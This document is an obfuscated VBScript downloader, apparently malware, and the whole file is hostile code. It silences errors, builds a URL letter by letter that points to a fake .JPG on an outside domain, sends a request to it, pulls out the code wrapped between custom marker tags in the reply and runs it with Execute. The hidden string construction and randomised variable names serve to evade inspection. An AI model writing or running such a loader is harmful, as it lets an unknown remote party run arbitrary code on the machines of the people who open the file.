On Error Resume Next
'//////////////////////////////////
Set Obj_NmHVq7 = CreateObject("MSXML2.ServerXMLHTTP.6.0")
'////////////////////////////////////////////////
Obj_NmHVq7.Open "POST", ("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+"m"+"f"+"i"+"s"+"h"+"e"+"r"+"l"+"l"+"c"+"c"+"o"+"n"+"s"+"u"+"l"+"t"+"."+"c"+"o"+"m"+"/"+"m"+"f"+"i"+"s"+"h"+"e"+"r"+"l"+"l"+"c"+"c"+"o"+"n"+"s"+"u"+"l"+"t"+"."+"c"+"o"+"m"+"/"+"P"+"O"+"W"+"G"+"O"+"S"+"T"+"A"+"R"+"T"+"B"+"."+"J"+"P"+"G"), False
Obj_NmHVq7.Send
If Len(Obj_NmHVq7.responseText) > 0 Then Execute E(Obj_NmHVq7.responseText) End If
'////////////////////////////////////////////////
Function E(Resp_jsEfJ4)
Dim Str_lGbUx3,End_CxqsS9,Pos_XWMWx3,EndPos_Rwszr7,Code_wXjHS7
Str_lGbUx3="<BackStartS>"
'////////////////////////////////////////////////
End_CxqsS9="</EndStartS>"
Pos_XWMWx3=InStr(Resp_jsEfJ4,Str_lGbUx3)+Len(Str_lGbUx3)
EndPos_Rwszr7=InStr(Pos_XWMWx3,Resp_jsEfJ4,End_CxqsS9)
If Pos_XWMWx3>Len(Str_lGbUx3) And EndPos_Rwszr7>Pos_XWMWx3 Then Code_wXjHS7=Mid(Resp_jsEfJ4,Pos_XWMWx3,EndPos_Rwszr7-Pos_XWMWx3):E=Code_wXjHS7 Else E="" End If
'////////////////////////////////////////////////
End Function
'////////////////////////////////////////////////